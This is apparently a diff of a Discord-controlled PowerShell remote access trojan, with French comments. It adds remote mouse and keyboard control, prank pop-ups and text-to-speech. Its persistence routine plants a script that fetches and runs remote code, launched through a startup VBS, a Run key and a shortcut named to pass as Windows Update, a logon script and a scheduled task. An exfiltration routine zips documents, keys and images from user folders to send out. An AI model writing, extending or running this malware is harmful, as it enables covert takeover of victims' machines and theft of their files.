+        sendMsg -Message ":octagonal_sign: ``Error getting mouse position: $($_.Exception.Message)`` :octagonal_sign:"
+    }
+}
+
+Function MoveMouse {
+    param([int]$X, [int]$Y)
+    try {
+        if (-not $X -or -not $Y) {
+            sendMsg -Message ":octagonal_sign: ``Usage: MoveMouse -X 100 -Y 200`` :octagonal_sign:"
+            return
+        }
+        Add-Type -TypeDefinition @"
+        using System;
+        using System.Runtime.InteropServices;
+        public class MouseControl {
+            [DllImport("user32.dll")]
+            public static extern bool SetCursorPos(int X, int Y);
+        }
+"@
+        [MouseControl]::SetCursorPos($X, $Y) | Out-Null
+        sendMsg -Message ":white_check_mark: ``Mouse moved to X=$X, Y=$Y`` :white_check_mark:"
+    }
+    catch {
+        sendMsg -Message ":octagonal_sign: ``Error moving mouse: $($_.Exception.Message)`` :octagonal_sign:"
+    }
+}
+
+Function MouseClick {
+    param([string]$Button = "left")
+    try {
+        Add-Type -TypeDefinition @"
+        using System;
+        using System.Runtime.InteropServices;
+        public class MouseClick {
+            [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
+            public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint cButtons, uint dwExtraInfo);
+            
+            private const uint MOUSEEVENTF_LEFTDOWN = 0x02;
+            private const uint MOUSEEVENTF_LEFTUP = 0x04;
+            private const uint MOUSEEVENTF_RIGHTDOWN = 0x08;
+            private const uint MOUSEEVENTF_RIGHTUP = 0x10;
+            
+            public static void LeftClick() {
+                mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
+                mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
+            }
+            
+            public static void RightClick() {
+                mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
+                mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
+            }
+        }
+"@
+        if ($Button -eq "left" -or $Button -eq "Left") {
+            [MouseClick]::LeftClick()
+            sendMsg -Message ":white_check_mark: ``Left click performed`` :white_check_mark:"
+        }
+        elseif ($Button -eq "right" -or $Button -eq "Right") {
+            [MouseClick]::RightClick()
+            sendMsg -Message ":white_check_mark: ``Right click performed`` :white_check_mark:"
+        }
+        else {
+            sendMsg -Message ":octagonal_sign: ``Usage: MouseClick -Button left|right`` :octagonal_sign:"
+        }
+    }
+    catch {
+        sendMsg -Message ":octagonal_sign: ``Error performing mouse click: $($_.Exception.Message)`` :octagonal_sign:"
+    }
+}
+
+Function TypeText {
+    param([string]$Text)
+    try {
+        if ([string]::IsNullOrWhiteSpace($Text)) {
+            sendMsg -Message ":octagonal_sign: ``Text is required. Usage: TypeText -Text \"your text\"`` :octagonal_sign:"
+            return
+        }
+        Add-Type -AssemblyName System.Windows.Forms
+        $Text = $Text -replace '`n', '{ENTER}' -replace '`r', '' -replace '`t', '{TAB}'
+        [System.Windows.Forms.SendKeys]::SendWait($Text)
+        sendMsg -Message ":white_check_mark: ``Text typed: $Text`` :white_check_mark:"
+    }
+    catch {
+        sendMsg -Message ":octagonal_sign: ``Error typing text: $($_.Exception.Message)`` :octagonal_sign:"
+    }
 }
 
 # --------------------------------------------------------------- PRANK FUNCTIONS ------------------------------------------------------------------------
@@ -549,9 +1102,22 @@ Function SendHydra {
     }
 }
 
-Function Message([string]$Message) {
-    msg.exe * $Message
-    sendMsg -Message ":arrows_counterclockwise: ``Message Sent to User..`` :arrows_counterclockwise:"
+Function Message {
+    param([string]$Message)
+    
+    if ([string]::IsNullOrWhiteSpace($Message)) {
+        sendMsg -Message ":octagonal_sign: ``Message is required. Usage: Message -Message \"your message\"`` :octagonal_sign:"
+        return
+    }
+    
+    try {
+        # Utiliser msg.exe pour afficher une popup
+        msg.exe * "$Message"
+        sendMsg -Message ":arrows_counterclockwise: ``Message Sent to User..`` :arrows_counterclockwise:"
+    }
+    catch {
+        sendMsg -Message ":octagonal_sign: ``Failed to send message: $($_.Exception.Message)`` :octagonal_sign:"
+    }
 }
 
 Function SoundSpam {
@@ -566,6 +1132,33 @@ Function VoiceMessage([string]$Message) {
     $SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
     $SpeechSynth.Speak($Message)
     sendMsg -Message ":white_check_mark: ``Message Sent!`` :white_check_mark:"
+}
+
+Function TextToSpeech {
+    param([string]$Text)
+    
+    try {
+        if ([string]::IsNullOrWhiteSpace($Text)) {
+            sendMsg -Message ":octagonal_sign: ``Text is required. Usage: TextToSpeech -Text \"your message\"`` :octagonal_sign:"
+            return
+        }
+        
+        Add-Type -AssemblyName System.Speech -ErrorAction Stop
+        $speechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
+        
+        sendMsg -Message ":speaking_head: ``Speaking: $Text`` :speaking_head:"
+        
+        # Parler le texte
+        $speechSynth.Speak($Text)
+        
+        # Nettoyer
+        $speechSynth.Dispose()
+        
+        sendMsg -Message ":white_check_mark: ``Text-to-Speech completed`` :white_check_mark:"
+    }
+    catch {
+        sendMsg -Message ":octagonal_sign: ``Text-to-Speech failed: $($_.Exception.Message)`` :octagonal_sign:"
+    }
 }
 
 Function MinimizeAll {
@@ -637,254 +1230,352 @@ Function ScreenParty {
 # --------------------------------------------------------------- PERSISTANCE FUNCTIONS ------------------------------------------------------------------------
 
 Function AddPersistance {
-    $newScriptPath = "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1"
-    $addedMethods = @()
+    $successCount = 0
     $failedMethods = @()
+    $persistenceMethods = @()
+    
+    # Chemin du script principal de persistance
+    $newScriptPath = "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1"
+    $scriptName = "copy.ps1"
     
     try {
-        # Créer le script PowerShell de persistance
+        # Créer le contenu du script de persistance avec gestion d'erreurs robuste
         $scriptContent = @"
+# Auto-generated persistence script
+`$ErrorActionPreference = 'SilentlyContinue'
 `$tk = `"$token`"
 `$parent = `"$parent`"
-irm `$parent | iex
+Start-Sleep -Seconds 5
+try {
+    `$response = Invoke-WebRequest -Uri `$parent -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
+    `$response.Content | Invoke-Expression
+}
+catch {
+    # Si le téléchargement échoue, réessayer après 30 secondes
+    Start-Sleep -Seconds 30
+    try {
+        `$response = Invoke-WebRequest -Uri `$parent -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
+        `$response.Content | Invoke-Expression
+    }
+    catch {
+        # En cas d'échec, le script se termine silencieusement
+        exit
+    }
+}
 "@
-        $scriptContent | Out-File -FilePath $newScriptPath -Force -Encoding UTF8
         
-        if (-not (Test-Path $newScriptPath)) {
-            sendMsg -Message ":octagonal_sign: ``Failed to create persistence script`` :octagonal_sign:"
-            return
+        # Créer le script principal
+        try {
+            $scriptContent | Out-File -FilePath $newScriptPath -Force -Encoding UTF8 -ErrorAction Stop
+            if (Test-Path $newScriptPath) {
+                $persistenceMethods += "Script principal créé: $newScriptPath"
+            }
+        }
+        catch {
+            $failedMethods += "Script principal: $($_.Exception.Message)"
         }
         
-        # Commande PowerShell à exécuter
-        $psCommand = "powershell.exe -NonI -NoP -Ep Bypass -W Hidden -File `"$newScriptPath`""
-        
-        # ========== MÉTHODE 1: Startup Folder VBS (méthode existante) ==========
+        # ========== MÉTHODE 1: Startup Folder VBS (méthode existante améliorée) ==========
         try {
             $vbsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
-            if (-not (Test-Path $vbsPath)) {
-                $vbsContent = @"
+            $vbsContent = @"
 Set objShell = CreateObject("WScript.Shell")
-objShell.Run "$psCommand", 0, True
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+Dim scriptPath
+scriptPath = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Themes\copy.ps1"
+If objFSO.FileExists(scriptPath) Then
+    objShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W Hidden -File """ & scriptPath & """", 0, False
+End If
 "@
-                $vbsContent | Out-File -FilePath $vbsPath -Force -Encoding ASCII
-                if (Test-Path $vbsPath) {
-                    $addedMethods += "Startup Folder VBS"
-                } else {
-                    $failedMethods += "Startup Folder VBS"
-                }
-            } else {
-                $addedMethods += "Startup Folder VBS (already exists)"
+            $vbsContent | Out-File -FilePath $vbsPath -Force -Encoding ASCII -ErrorAction Stop
+            if (Test-Path $vbsPath) {
+                $successCount++
+                $persistenceMethods += "Startup Folder VBS: $vbsPath"
             }
         }
         catch {
-            $failedMethods += "Startup Folder VBS: $($_.Exception.Message)"
+            $failedMethods += "Startup VBS: $($_.Exception.Message)"
         }
         
-        # ========== MÉTHODE 2: UserInitMprLogonScript (Registre HKCU) ==========
+        # ========== MÉTHODE 2: HKCU Run Key (Registre) ==========
         try {
-            $regPath = "HKCU:\Environment"
-            $regName = "UserInitMprLogonScript"
-            $regValue = $psCommand
+            $runKeyName = "WindowsUpdateService"
+            $runKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+            $runCommand = "powershell.exe -NonI -NoP -Ep Bypass -W Hidden -File `"$newScriptPath`""
             
-            if (-not (Test-Path $regPath)) {
-                New-Item -Path $regPath -Force | Out-Null
+            # Vérifier si la clé existe déjà
+            $existing = Get-ItemProperty -Path $runKeyPath -Name $runKeyName -ErrorAction SilentlyContinue
+            if ($existing) {
+                Set-ItemProperty -Path $runKeyPath -Name $runKeyName -Value $runCommand -Force -ErrorAction Stop
+            }
+            else {
+                New-ItemProperty -Path $runKeyPath -Name $runKeyName -Value $runCommand -PropertyType String -Force -ErrorAction Stop | Out-Null
             }
             
-            $currentValue = (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue).$regName
-            if ($currentValue -ne $regValue) {
-                Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Type String -Force
-                $addedMethods += "UserInitMprLogonScript (Registry)"
-            } else {
-                $addedMethods += "UserInitMprLogonScript (already exists)"
+            # Vérifier que la valeur a été correctement enregistrée
+            $verify = Get-ItemProperty -Path $runKeyPath -Name $runKeyName -ErrorAction SilentlyContinue
+            if ($verify -and $verify.$runKeyName -eq $runCommand) {
+                $successCount++
+                $persistenceMethods += "HKCU Run Key: $runKeyName"
             }
-        }
-        catch {
-            $failedMethods += "UserInitMprLogonScript: $($_.Exception.Message)"
-        }
-        
-        # ========== MÉTHODE 3: HKCU Run Key (Registre HKCU) ==========
-        try {
-            $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-            $regName = "WindowsUpdateService"
-            $regValue = $psCommand
-            
-            if (-not (Test-Path $regPath)) {
-                New-Item -Path $regPath -Force | Out-Null
-            }
-            
-            $currentValue = (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue).$regName
-            if ($currentValue -ne $regValue) {
-                Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Type String -Force
-                $addedMethods += "HKCU Run Key (Registry)"
-            } else {
-                $addedMethods += "HKCU Run Key (already exists)"
+            else {
+                throw "Vérification échouée"
             }
         }
         catch {
             $failedMethods += "HKCU Run Key: $($_.Exception.Message)"
         }
         
-        # ========== MÉTHODE 4: LNK Startup Folder ==========
+        # ========== MÉTHODE 3: UserInitMprLogonScript (Registre) ==========
         try {
-            $startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
-            $lnkPath = "$startupFolder\WindowsUpdate.lnk"
+            $userInitKeyPath = "HKCU:\Environment"
+            $userInitValueName = "UserInitMprLogonScript"
+            $userInitCommand = "powershell.exe -NonI -NoP -Ep Bypass -W Hidden -File `"$newScriptPath`""
             
-            if (-not (Test-Path $lnkPath)) {
-                $WshShell = New-Object -ComObject WScript.Shell
-                $Shortcut = $WshShell.CreateShortcut($lnkPath)
-                $Shortcut.TargetPath = "powershell.exe"
-                $Shortcut.Arguments = "-NonI -NoP -Ep Bypass -W Hidden -File `"$newScriptPath`""
-                $Shortcut.WorkingDirectory = "$env:APPDATA\Microsoft\Windows\Themes"
-                $Shortcut.WindowStyle = 7  # Minimized
-                $Shortcut.IconLocation = "shell32.dll,1"
-                $Shortcut.Description = "Windows Update Service"
-                $Shortcut.Save()
-                
-                if (Test-Path $lnkPath) {
-                    $addedMethods += "LNK Startup Folder"
-                } else {
-                    $failedMethods += "LNK Startup Folder"
+            # Vérifier si la valeur existe déjà
+            $existing = Get-ItemProperty -Path $userInitKeyPath -Name $userInitValueName -ErrorAction SilentlyContinue
+            if ($existing) {
+                # Préserver la valeur existante et ajouter la nôtre
+                $existingValue = $existing.$userInitValueName
+                if ($existingValue -notlike "*$newScriptPath*") {
+                    $userInitCommand = "$existingValue & $userInitCommand"
                 }
-            } else {
-                $addedMethods += "LNK Startup Folder (already exists)"
+                else {
+                    $userInitCommand = $existingValue
+                }
+            }
+            
+            Set-ItemProperty -Path $userInitKeyPath -Name $userInitValueName -Value $userInitCommand -Force -ErrorAction Stop
+            
+            # Vérifier que la valeur a été correctement enregistrée
+            $verify = Get-ItemProperty -Path $userInitKeyPath -Name $userInitValueName -ErrorAction SilentlyContinue
+            if ($verify -and $verify.$userInitValueName -like "*$newScriptPath*") {
+                $successCount++
+                $persistenceMethods += "UserInitMprLogonScript: $userInitValueName"
+            }
+            else {
+                throw "Vérification échouée"
             }
         }
         catch {
-            $failedMethods += "LNK Startup Folder: $($_.Exception.Message)"
+            $failedMethods += "UserInitMprLogonScript: $($_.Exception.Message)"
         }
         
-        # ========== Résumé des résultats ==========
-        $summary = "Persistence added via:`n"
-        foreach ($method in $addedMethods) {
-            $summary += "✓ $method`n"
-        }
-        
-        if ($failedMethods.Count -gt 0) {
-            $summary += "`nFailed methods:`n"
-            foreach ($method in $failedMethods) {
-                $summary += "✗ $method`n"
+        # ========== MÉTHODE 4: Startup Folder LNK (Raccourci) ==========
+        try {
+            $lnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.lnk"
+            $targetPath = "powershell.exe"
+            $arguments = "-NonI -NoP -Ep Bypass -W Hidden -File `"$newScriptPath`""
+            $workingDir = "$env:APPDATA\Microsoft\Windows\Themes"
+            
+            # Créer le raccourci via COM
+            $WshShell = New-Object -ComObject WScript.Shell
+            $Shortcut = $WshShell.CreateShortcut($lnkPath)
+            $Shortcut.TargetPath = $targetPath
+            $Shortcut.Arguments = $arguments
+            $Shortcut.WorkingDirectory = $workingDir
+            $Shortcut.WindowStyle = 7  # Minimized
+            $Shortcut.IconLocation = "shell32.dll,1"
+            $Shortcut.Description = "Windows Update Service"
+            $Shortcut.Save()
+            
+            if (Test-Path $lnkPath) {
+                $successCount++
+                $persistenceMethods += "Startup Folder LNK: $lnkPath"
+            }
+            else {
+                throw "Le fichier LNK n'a pas été créé"
             }
         }
+        catch {
+            $failedMethods += "Startup LNK: $($_.Exception.Message)"
+        }
         
-        sendMsg -Message ":white_check_mark: ``Persistence Added!`n$summary`` :white_check_mark:"
+        # ========== MÉTHODE 5: Scheduled Task (si admin disponible, sinon ignoré) ==========
+        try {
+            $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')
+            if ($isAdmin) {
+                $taskName = "WindowsUpdateService"
+                $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NonI -NoP -Ep Bypass -W Hidden -File `"$newScriptPath`""
+                $taskTrigger = New-ScheduledTaskTrigger -AtLogOn
+                $taskPrincipal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive
+                $taskSettings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+                
+                # Supprimer la tâche existante si elle existe
+                Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
+                
+                # Créer la nouvelle tâche
+                Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings -Force -ErrorAction Stop | Out-Null
+                
+                $verify = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+                if ($verify) {
+                    $successCount++
+                    $persistenceMethods += "Scheduled Task: $taskName (Admin)"
+                }
+            }
+        }
+        catch {
+            # Ignorer silencieusement si pas admin ou erreur
+        }
+        
+        # Résumé des résultats
+        $summary = "Persistance installée: $successCount méthode(s) activée(s)"
+        if ($persistenceMethods.Count -gt 0) {
+            $summary += "`nMéthodes installées:`n" + ($persistenceMethods -join "`n")
+        }
+        if ($failedMethods.Count -gt 0) {
+            $summary += "`nÉchecs:`n" + ($failedMethods -join "`n")
+        }
+        
+        if ($successCount -gt 0) {
+            sendMsg -Message ":white_check_mark: ``$summary`` :white_check_mark:"
+        }
+        else {
+            sendMsg -Message ":octagonal_sign: ``Échec de l'installation de la persistance. Aucune méthode n'a réussi.`` :octagonal_sign:"
+        }
     }
     catch {
-        sendMsg -Message ":octagonal_sign: ``Error adding persistence: $($_.Exception.Message)`` :octagonal_sign:"
+        sendMsg -Message ":octagonal_sign: ``Erreur critique lors de l'ajout de la persistance: $($_.Exception.Message)`` :octagonal_sign:"
     }
 }
 
 Function RemovePersistance {
+    $removedCount = 0
     $removedMethods = @()
-    $failedMethods = @()
+    $notFoundMethods = @()
     
-    # ========== MÉTHODE 1: Startup Folder VBS ==========
-    try {
-        $vbsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
+    # ========== SUPPRESSION 1: Startup Folder VBS ==========
+    $vbsPaths = @(
+        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs",
+        "C:\Windows\Tasks\service.vbs"
+    )
+    foreach ($vbsPath in $vbsPaths) {
         if (Test-Path $vbsPath) {
-            Remove-Item -Path $vbsPath -Force -ErrorAction Stop
-            $removedMethods += "Startup Folder VBS"
-        }
-    }
-    catch {
-        $failedMethods += "Startup Folder VBS: $($_.Exception.Message)"
-    }
-    
-    # ========== MÉTHODE 2: UserInitMprLogonScript (Registre HKCU) ==========
-    try {
-        $regPath = "HKCU:\Environment"
-        $regName = "UserInitMprLogonScript"
-        
-        if (Test-Path $regPath) {
-            $currentValue = (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue).$regName
-            if ($currentValue) {
-                Remove-ItemProperty -Path $regPath -Name $regName -Force -ErrorAction Stop
-                $removedMethods += "UserInitMprLogonScript (Registry)"
+            try {
+                Remove-Item -Path $vbsPath -Force -ErrorAction Stop
+                $removedCount++
+                $removedMethods += "VBS supprimé: $vbsPath"
+            }
+            catch {
+                $notFoundMethods += "Erreur suppression VBS $vbsPath : $($_.Exception.Message)"
             }
         }
     }
-    catch {
-        $failedMethods += "UserInitMprLogonScript: $($_.Exception.Message)"
-    }
     
-    # ========== MÉTHODE 3: HKCU Run Key (Registre HKCU) ==========
-    try {
-        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-        $regName = "WindowsUpdateService"
-        
-        if (Test-Path $regPath) {
-            $currentValue = (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue).$regName
-            if ($currentValue) {
-                Remove-ItemProperty -Path $regPath -Name $regName -Force -ErrorAction Stop
-                $removedMethods += "HKCU Run Key (Registry)"
-            }
-        }
-    }
-    catch {
-        $failedMethods += "HKCU Run Key: $($_.Exception.Message)"
-    }
-    
-    # ========== MÉTHODE 4: LNK Startup Folder ==========
-    try {
-        $lnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.lnk"
-        if (Test-Path $lnkPath) {
-            Remove-Item -Path $lnkPath -Force -ErrorAction Stop
-            $removedMethods += "LNK Startup Folder"
-        }
-    }
-    catch {
-        $failedMethods += "LNK Startup Folder: $($_.Exception.Message)"
-    }
-    
-    # ========== Script PowerShell principal ==========
-    try {
-        $scriptPath = "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1"
+    # ========== SUPPRESSION 2: Script principal ==========
+    $scriptPaths = @(
+        "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1",
+        "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
+    )
+    foreach ($scriptPath in $scriptPaths) {
         if (Test-Path $scriptPath) {
-            Remove-Item -Path $scriptPath -Force -ErrorAction Stop
-            $removedMethods += "Main PowerShell Script"
-        }
-    }
-    catch {
-        $failedMethods += "Main PowerShell Script: $($_.Exception.Message)"
-    }
-    
-    # ========== Ancien VBS dans C:\Windows\Tasks (legacy) ==========
-    try {
-        $legacyVbsPath = "C:\Windows\Tasks\service.vbs"
-        if (Test-Path $legacyVbsPath) {
-            Remove-Item -Path $legacyVbsPath -Force -ErrorAction Stop
-            $removedMethods += "Legacy VBS (C:\Windows\Tasks)"
-        }
-    }
-    catch {
-        $failedMethods += "Legacy VBS: $($_.Exception.Message)"
-    }
-    
-    # ========== Résumé des résultats ==========
-    if ($removedMethods.Count -gt 0) {
-        $summary = "Persistence removed from:`n"
-        foreach ($method in $removedMethods) {
-            $summary += "✓ $method`n"
-        }
-        
-        if ($failedMethods.Count -gt 0) {
-            $summary += "`nFailed to remove:`n"
-            foreach ($method in $failedMethods) {
-                $summary += "✗ $method`n"
+            try {
+                Remove-Item -Path $scriptPath -Force -ErrorAction Stop
+                $removedCount++
+                $removedMethods += "Script supprimé: $scriptPath"
+            }
+            catch {
+                $notFoundMethods += "Erreur suppression script $scriptPath : $($_.Exception.Message)"
             }
         }
+    }
+    
+    # ========== SUPPRESSION 3: HKCU Run Key ==========
+    try {
+        $runKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+        $runKeyName = "WindowsUpdateService"
         
-        sendMsg -Message ":white_check_mark: ``Persistence Removed!`n$summary`` :white_check_mark:"
+        $existing = Get-ItemProperty -Path $runKeyPath -Name $runKeyName -ErrorAction SilentlyContinue
+        if ($existing) {
+            Remove-ItemProperty -Path $runKeyPath -Name $runKeyName -Force -ErrorAction Stop
+            $removedCount++
+            $removedMethods += "HKCU Run Key supprimé: $runKeyName"
+        }
+    }
+    catch {
+        $notFoundMethods += "Erreur suppression HKCU Run Key: $($_.Exception.Message)"
+    }
+    
+    # ========== SUPPRESSION 4: UserInitMprLogonScript ==========
+    try {
+        $userInitKeyPath = "HKCU:\Environment"
+        $userInitValueName = "UserInitMprLogonScript"
+        
+        $existing = Get-ItemProperty -Path $userInitKeyPath -Name $userInitValueName -ErrorAction SilentlyContinue
+        if ($existing) {
+            $currentValue = $existing.$userInitValueName
+            $scriptPath = "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1"
+            
+            # Si la valeur contient notre script, la nettoyer
+            if ($currentValue -like "*$scriptPath*") {
+                # Retirer notre commande de la valeur
+                $newValue = $currentValue -replace "[^&]*$scriptPath[^&]*", "" -replace "&&+", "&" -replace "^&+|&+$", ""
+                
+                if ([string]::IsNullOrWhiteSpace($newValue)) {
+                    # Si la valeur est vide après nettoyage, supprimer la clé
+                    Remove-ItemProperty -Path $userInitKeyPath -Name $userInitValueName -Force -ErrorAction Stop
+                }
+                else {
+                    # Sinon, mettre à jour avec la valeur nettoyée
+                    Set-ItemProperty -Path $userInitKeyPath -Name $userInitValueName -Value $newValue -Force -ErrorAction Stop
+                }
+                $removedCount++
+                $removedMethods += "UserInitMprLogonScript nettoyé"
+            }
+        }
+    }
+    catch {
+        $notFoundMethods += "Erreur suppression UserInitMprLogonScript: $($_.Exception.Message)"
+    }
+    
+    # ========== SUPPRESSION 5: Startup Folder LNK ==========
+    $lnkPaths = @(
+        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.lnk",
+        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.lnk"
+    )
+    foreach ($lnkPath in $lnkPaths) {
+        if (Test-Path $lnkPath) {
+            try {
+                Remove-Item -Path $lnkPath -Force -ErrorAction Stop
+                $removedCount++
+                $removedMethods += "LNK supprimé: $lnkPath"
+            }
+            catch {
+                $notFoundMethods += "Erreur suppression LNK $lnkPath : $($_.Exception.Message)"
+            }
+        }
+    }
+    
+    # ========== SUPPRESSION 6: Scheduled Task (si admin) ==========
+    try {
+        $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')
+        if ($isAdmin) {
+            $taskName = "WindowsUpdateService"
+            $task = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+            if ($task) {
+                Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -Force -ErrorAction Stop
+                $removedCount++
+                $removedMethods += "Scheduled Task supprimé: $taskName"
+            }
+        }
+    }
+    catch {
+        # Ignorer silencieusement
+    }
+    
+    # Résumé des résultats
+    if ($removedCount -gt 0) {
+        $summary = "Persistance supprimée: $removedCount élément(s) retiré(s)"
+        if ($removedMethods.Count -gt 0) {
+            $summary += "`nÉléments supprimés:`n" + ($removedMethods -join "`n")
+        }
+        if ($notFoundMethods.Count -gt 0) {
+            $summary += "`nAvertissements:`n" + ($notFoundMethods -join "`n")
+        }
+        sendMsg -Message ":white_check_mark: ``$summary`` :white_check_mark:"
     }
     else {
-        if ($failedMethods.Count -gt 0) {
-            $summary = "Failed to remove:`n"
-            foreach ($method in $failedMethods) {
-                $summary += "✗ $method`n"
-            }
-            sendMsg -Message ":octagonal_sign: ``$summary`` :octagonal_sign:"
-        } else {
-            sendMsg -Message ":octagonal_sign: ``No persistence found to remove`` :octagonal_sign:"
-        }
+        sendMsg -Message ":octagonal_sign: ``Aucune persistance trouvée à supprimer`` :octagonal_sign:"
     }
 }
 
@@ -892,95 +1583,408 @@ Function RemovePersistance {
 
 Function Exfiltrate {
     param ([string[]]$FileType, [string[]]$Path)
-    sendMsg -Message ":file_folder: ``Exfiltration Started..`` :file_folder:"
-    $maxZipFileSize = 10MB
-    $currentZipSize = 0
-    $index = 1
-    $zipFilePath = "$env:temp/Loot$index.zip"
-    If ($Path -ne $null) {
-        $foldersToSearch = "$env:USERPROFILE\" + $Path
-    }
-    else {
-        $foldersToSearch = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\OneDrive", "$env:USERPROFILE\Pictures", "$env:USERPROFILE\Videos")
-    }
-    If ($FileType -ne $null) {
-        $fileExtensions = "*." + $FileType
-    }
-    else {
-        $fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")
-    }
-    Add-Type -AssemblyName System.IO.Compression.FileSystem
-    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
-    foreach ($folder in $foldersToSearch) {
-        foreach ($extension in $fileExtensions) {
-            $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse
-            foreach ($file in $files) {
-                $fileSize = $file.Length
-                if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
-                    $zipArchive.Dispose()
-                    $currentZipSize = 0
-                    sendFile -sendfilePath $zipFilePath | Out-Null
-                    Sleep 1
-                    Remove-Item -Path $zipFilePath -Force
-                    $index++
-                    $zipFilePath = "$env:temp/Loot$index.zip"
-                    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
+    
+    try {
+        # Message de démarrage simplifié (sans markdown complexe pour éviter erreurs 400)
+        $startMsg = ":file_folder: Exfiltration Started :file_folder:"
+        if ($Path) {
+            $pathStr = $Path -join ', '
+            if (($startMsg + " | Paths: " + $pathStr).Length -lt 1900) {
+                $startMsg += " | Paths: $pathStr"
+            }
+        }
+        if ($FileType) {
+            $typeStr = $FileType -join ', '
+            if (($startMsg + " | Types: " + $typeStr).Length -lt 1900) {
+                $startMsg += " | Types: $typeStr"
+            }
+        }
+        sendMsg -Message "``$startMsg``"
+        
+        $maxZipFileSize = 10MB
+        $currentZipSize = 0
+        $index = 1
+        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
+        $dateStr = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
+        $zipFilePath = "$env:temp/Exfiltration_${dateStr}_Part${index}.zip"
+        $totalFiles = 0
+        $totalSize = 0
+        $filesProcessed = 0
+        $filesSkipped = 0
+        $fileList = @()  # Liste pour stocker les fichiers par archive
+        
+        # Nettoyer les anciens fichiers d'exfiltration s'ils existent
+        Get-ChildItem -Path "$env:temp" -Filter "Loot*.zip" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+        Get-ChildItem -Path "$env:temp" -Filter "Exfiltration_*.zip" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+        
+        If ($Path -ne $null) {
+            $foldersToSearch = @("$env:USERPROFILE\" + $Path)
+        }
+        else {
+            $foldersToSearch = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\OneDrive", "$env:USERPROFILE\Pictures", "$env:USERPROFILE\Videos")
+        }
+        If ($FileType -ne $null) {
+            $fileExtensions = @("*." + $FileType)
+        }
+        else {
+            $fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")
+        }
+        
+        Add-Type -AssemblyName System.IO.Compression.FileSystem
+        $zipArchive = $null
+        
+        foreach ($folder in $foldersToSearch) {
+            if (-not (Test-Path $folder)) {
+                Write-Host "Folder not found: $folder" -ForegroundColor Yellow
+                continue
+            }
+            
+            foreach ($extension in $fileExtensions) {
+                try {
